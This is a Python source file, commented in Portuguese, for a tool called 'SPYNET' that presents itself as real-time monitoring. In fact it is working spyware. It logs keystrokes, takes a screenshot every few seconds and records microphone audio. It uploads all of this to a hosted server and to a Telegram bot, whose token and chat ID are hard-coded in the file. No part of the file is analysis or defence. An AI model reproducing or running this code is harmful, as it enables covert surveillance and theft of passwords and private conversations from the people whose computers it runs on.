"""
SPYNET CLIENTE LOCAL - Monitoramento em Tempo Real
Roda no computador do cliente e envia dados para o servidor online
"""

import os
import sys
import threading
import time
import requests
import pyautogui
import sounddevice as sd
import soundfile as sf
from pynput import keyboard
from datetime import datetime
import numpy as np
import json
import base64

# ============================================
# CONFIGURAÇÕES
# ============================================

# URL DO SEU SERVIDOR NO RENDER
SERVIDOR_URL = "https://sentinel-monitor.onrender.com"

# Telegram (opcional - enviar direto também)
BOT_TOKEN = "8714368220:AAEOvQQlzPlXkEFGPYSdKzm2N2kD-owOam0"
CHAT_ID = "5672315001"

# Pastas locais
DATA_DIR = "SystemData"
LOG_DIR = os.path.join(DATA_DIR, "logs")
SCREENSHOT_DIR = os.path.join(DATA_DIR, "screenshots")
AUDIO_DIR = os.path.join(DATA_DIR, "audio")
KEYLOG_PATH = os.path.join(LOG_DIR, "syslog.txt")

for pasta in [DATA_DIR, LOG_DIR, SCREENSHOT_DIR, AUDIO_DIR]:
    os.makedirs(pasta, exist_ok=True)

# Variáveis
monitor_ativo = True
tempo_screenshot = 5
tempo_audio = 10
ultima_screenshot = None
ultimo_audio = None
ultimas_teclas = []
buffer_teclas = ""
ultimo_tempo = time.time()

# ============================================
# FUNÇÕES
# ============================================

def enviar_telegram(texto, caminho=None):
    try:
        if caminho and os.path.exists(caminho):
            with open(caminho, "rb") as f:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                requests.post(url, data={"chat_id": CHAT_ID, "caption": texto}, files={"document": f}, timeout=5)
        else:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={"chat_id": CHAT_ID, "text": texto}, timeout=5)
    except:
        pass

def enviar_para_servidor(tipo, dados):
    """Envia dados para o servidor online"""
    try:
        url = f"{SERVIDOR_URL}/api/upload"
        if tipo == "screenshot" and os.path.exists(dados):
            with open(dados, "rb") as f:
                files = {"screenshot": f}
                requests.post(url, files=files, timeout=10)
        elif tipo == "audio" and os.path.exists(dados):
            with open(dados, "rb") as f:
                files = {"audio": f}
                requests.post(url, files=files, timeout=10)
        elif tipo == "teclas":
            requests.post(url, json={"teclas": dados}, timeout=10)
    except Exception as e:
        print(f"Erro ao enviar para servidor: {e}")

def processar_tecla(tecla):
    global buffer_teclas, ultimas_teclas, monitor_ativo, ultimo_tempo
    if not monitor_ativo:
        return
    try:
        if hasattr(tecla, 'char') and tecla.char:
            caractere = tecla.char
            if caractere.isalnum() or caractere in [' ', '.', ',', '!', '?', '@', '#', '$', '-', '_']:
                buffer_teclas += caractere
                ultimo_tempo = time.time()
            elif caractere == '\r' or caractere == '\n':
                if buffer_teclas.strip():
                    registrar_frase(buffer_teclas.strip())
                buffer_teclas = ""
        else:
            tecla_nome = str(tecla).replace('Key.', '')
            if tecla_nome == 'space':
                buffer_teclas += ' '
                ultimo_tempo = time.time()
            elif tecla_nome == 'enter':
                if buffer_teclas.strip():
                    registrar_frase(buffer_teclas.strip())
                buffer_teclas = ""
            elif tecla_nome == 'backspace':
                buffer_teclas = buffer_teclas[:-1]
        
        if time.time() - ultimo_tempo > 2 and buffer_teclas.strip():
            registrar_frase(buffer_teclas.strip())
            buffer_teclas = ""
    except:
        pass

def registrar_frase(frase):
    global ultimas_teclas
    if not frase.strip():
        return
    registro = f"[{datetime.now().strftime('%H:%M:%S')}] {frase}"
    with open(KEYLOG_PATH, "a", encoding="utf-8") as f:
        f.write(registro + "\n")
    ultimas_teclas.append(registro)
    if len(ultimas_teclas) > 100:
        ultimas_teclas.pop(0)
    enviar_telegram(f"⌨️ {frase}")
    enviar_para_servidor("teclas", [registro])

def capturar_screenshot():
    global ultima_screenshot, monitor_ativo
    if not monitor_ativo:
        return None
    try:
        nome = f"scr_{int(time.time())}.png"
        caminho = os.path.join(SCREENSHOT_DIR, nome)
        pyautogui.screenshot(caminho)
        ultima_screenshot = caminho
        enviar_telegram("📸 Screenshot", caminho)
        enviar_para_servidor("screenshot", caminho)
        return caminho
    except:
        return None

def capturar_audio():
    global ultimo_audio, monitor_ativo
    if not monitor_ativo:
        return None
    try:
        nome = f"aud_{int(time.time())}.wav"
        caminho = os.path.join(AUDIO_DIR, nome)
        fs = 44100
        duracao = 5
        gravacao = sd.rec(int(duracao * fs), samplerate=fs, channels=2, dtype='float32')
        sd.wait()
        gravacao = np.clip(gravacao * 5.0, -1.0, 1.0)
        sf.write(caminho, gravacao, fs)
        ultimo_audio = caminho
        enviar_telegram("🎤 Áudio", caminho)
        enviar_para_servidor("audio", caminho)
        return caminho
    except:
        return None

def loop_captura():
    global monitor_ativo, tempo_screenshot
    while True:
        if monitor_ativo:
            capturar_screenshot()
        time.sleep(tempo_screenshot)

def loop_audio():
    global monitor_ativo, tempo_audio
    while True:
        if monitor_ativo:
            capturar_audio()
        time.sleep(tempo_audio)

def iniciar_keylogger():
    with keyboard.Listener(on_press=processar_tecla) as listener:
        listener.join()

# ============================================
# MAIN
# ============================================

if __name__ == "__main__":
    print("=" * 60)
    print("🛡️ SPYNET CLIENTE LOCAL - MONITORAMENTO")
    print("=" * 60)
    print(f"📡 Enviando dados para: {SERVIDOR_URL}")
    print(f"📸 Screenshot: a cada {tempo_screenshot}s")
    print(f"🎤 Áudio: a cada {tempo_audio}s")
    print(f"⌨️ Keylogger: ativo")
    print("=" * 60)
    
    enviar_telegram("🛡️ SPYNET CLIENTE LOCAL INICIADO!")
    
    threading.Thread(target=iniciar_keylogger, daemon=True).start()
    threading.Thread(target=loop_captura, daemon=True).start()
    threading.Thread(target=loop_audio, daemon=True).start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n👋 Encerrando...")